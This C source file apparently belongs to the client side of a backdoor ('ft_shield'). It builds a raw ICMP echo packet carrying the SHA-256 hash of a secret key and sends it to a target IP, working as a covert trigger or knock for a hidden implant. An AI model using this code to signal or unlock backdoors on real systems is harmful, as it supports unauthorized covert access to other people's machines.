#include "ft_shield.h"

uint16_t    calculate_checksum(void *packet, size_t len)
{
    uint16_t    *buffer = packet;
    uint32_t    sum = 0;

    for (size_t i = 0; i < len / 2; i++)
        sum += buffer[i];
    if (len % 2)
        sum += ((uint8_t*)packet)[len - 1];
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return (~sum);
}

int socket_creation(t_backdoor *backdoor)
{
    struct timeval  timeout = {9, 0};

    backdoor->socketfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (backdoor->socketfd == -1)
        return (-1);
    if (setsockopt(backdoor->socketfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) == -1)
    {
        printf("TIMEOUT SOCKET ( %d )\n", backdoor->socketfd);
        close(backdoor->socketfd);
        return (-1);
    }
    return (0);
}

void    icmp_creation(t_backdoor *backdoor)
{
    int             payload_len;
    unsigned char   hash_payload[32];

    memset(backdoor->packet, 0, PACKET_SIZE);

    backdoor->icmp_hdr = (struct icmphdr *)backdoor->packet;
    backdoor->icmp_hdr->type = ICMP_ECHO;
    backdoor->icmp_hdr->code = 0;
    backdoor->icmp_hdr->un.echo.id = getpid();
    backdoor->icmp_hdr->un.echo.sequence = 1;
    backdoor->icmp_hdr->checksum = 0;

    backdoor->payload = backdoor->packet + sizeof(struct icmphdr);

    ft_sha256(backdoor->buffer, strlen(backdoor->buffer), hash_payload);

    memcpy(backdoor->payload, hash_payload, 32);
    payload_len = 32;

    backdoor->icmp_hdr->checksum = calculate_checksum(backdoor->packet, sizeof(struct icmphdr) + payload_len);

    memset(&backdoor->target_addr, 0, sizeof(backdoor->target_addr));
    backdoor->target_addr.sin_family = AF_INET;
    inet_pton(AF_INET, backdoor->target_ip, &backdoor->target_addr.sin_addr);

    printf("Sending ICMP packet carrying the secret key...\n");
    if (sendto(backdoor->socketfd, backdoor->packet, sizeof(struct icmphdr) + payload_len, 0,
            (struct sockaddr *)&backdoor->target_addr, sizeof(backdoor->target_addr)) < 0)
        printf("Error sending with sendto (Did you forget sudo?)\n");
    else
        printf("Package successfully shipped to %s!\n", backdoor->target_ip);
    return;
}
